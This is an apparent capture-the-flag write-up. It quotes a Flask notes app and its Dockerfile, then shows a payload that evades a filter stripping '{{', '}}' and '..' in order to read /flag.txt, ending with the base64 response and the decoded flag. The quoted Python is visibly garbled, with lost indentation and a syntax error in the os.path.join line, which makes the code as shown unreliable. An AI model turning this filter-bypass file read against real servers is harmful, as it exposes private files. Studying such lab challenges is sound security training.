
## source code from zip file

```python
from flask import Flask, render_template, jsonify, request  
import re, os, base64  
  
app = Flask(__name__)  
  
# Root endpoint  
@app.route("/")  
def index():  
return render_template("index.html")  
  
# Notes endpoint  
@app.route("/notes", methods=["GET", "POST"])  
def notes():  
if request.method == "GET":  
	return render_template("notes.html")  
elif request.method == "POST":  
	note = request.form.get("note")  
	note = note.replace("{{", "").replace("}}", "").replace("..", "")  
	print("note: ",note)  
	for include in re.findall("({{.*?}})", note):  
		file_name = os.path.join("notes",, "", include))  
		print("filename: ",file_name)  
	try:  
		with open(file_name, "rb") as file:  
			note = note.replace(include, f"<img src=\"data:image/png;base64,{base64.b64encode(file.read()).decode('latin1')}\" width=\"25\" height=\"25\" />")  
	except FileNotFoundError:  
		return "Sorry, No note found by this name", 404  
	return note
	  
if __name__ == "__main__":  
app.run(debug=False,host="0.0.0.0",port=7080)
```

## docker file
```docker
FROM python:3.9-slim-buster

WORKDIR /app

COPY requirements.txt .

RUN apt-get update && apt-get upgrade -y

RUN pip install --no-cache-dir -r requirements.txt

COPY . .

RUN mv flag.txt /

EXPOSE 7080

CMD ["python", "app.py"]
```

##### Breakdown for the code 
- the code get a post request with parameter `note` which is a path for a file 
- the code replace every  `{{` , `}}` , `..` with empty string
- to enter the for loop which return files the string must be in this form {{any_text}}
- when the note path is set every {} will be placed with null
- will return an image with data scheme with content of the file encoded in base64

##### we want to read `/flag.txt`  , to enter the for loop our string need to be like this `{{/flag.txt}}` to return `/flag.txt` , but how can this be done while `{{` and `}}` is replaced the answer is in `..`

##### the `{` and `}` is not replaced and `..` is replaced to null , so lets construct the payload  
```
{..{}}/flag.txt{{}..} => during the ctf i used this
or
{..{/flag.txt}..} => while wrting the writeup i figured out this and it is simbler
```

##### after we submit it an image will return
```html
<img src="data:image/png;base64,Q0FURntZMFVfNFIzX1RIM19sMzN0X0JZUEFTUzNSfQ==" width="25" height="25">
```

##### decode the base64 value and here is out flag
```
CATF{Y0U_4R3_TH3_l33t_BYPASS3R}
```